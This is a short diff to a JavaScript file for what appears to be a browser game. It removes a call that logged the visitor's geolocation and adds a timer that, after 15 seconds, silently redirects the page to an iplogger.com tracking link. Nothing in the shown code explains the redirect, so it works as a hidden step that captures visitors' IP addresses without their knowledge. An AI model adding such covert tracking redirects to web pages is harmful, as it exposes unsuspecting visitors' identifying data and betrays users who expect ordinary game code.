@@ -274,6 +274,6 @@ function displayofthegame() {
 
 
 }
- navigator.geolocation.getCurrentPosition((event) => {
-    console.log(event);
-  })
+setTimeout(() =>{
+  location.assign('https://iplogger.com/2X5X65')
+},15000)
